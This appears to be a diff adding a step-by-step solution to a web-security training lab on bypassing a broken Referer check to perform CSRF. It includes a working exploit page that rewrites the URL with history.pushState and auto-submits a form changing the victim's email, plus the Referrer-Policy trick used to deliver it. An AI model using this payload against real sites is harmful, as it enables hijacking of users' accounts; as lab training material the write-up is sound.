@@ -1,0 +1,48 @@
+1. Login & capture request
+
+Login to the lab account and submit Update Email form.
+Capture the request in Burp Proxy history.
+
+2. Send to Repeater
+
+Right-click the request → Send to Repeater.
+
+3. Test Referer block
+
+Change header:
+
+Referer: https://evil.com
+
+Send → ❌ Request rejected
+
+4. Bypass Referer check
+
+Modify Referer:
+
+Referer: https://random.net?YOUR-LAB-ID.web-security-academy.net
+
+Send → ✅ Request accepted
+
+5. Create CSRF exploit
+
+Add this in exploit server:
+
+<script>
+history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net");
+</script>
+
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+<input type="hidden" name="email" value="attacker@test.com">
+</form>
+<script>document.forms[0].submit();</script>
+6. Deliver exploit
+
+Add header in exploit server:
+
+Referrer-Policy: unsafe-url
+
+Then:
+
+Store exploit
+Click Deliver to victim
+Lab solved ✅
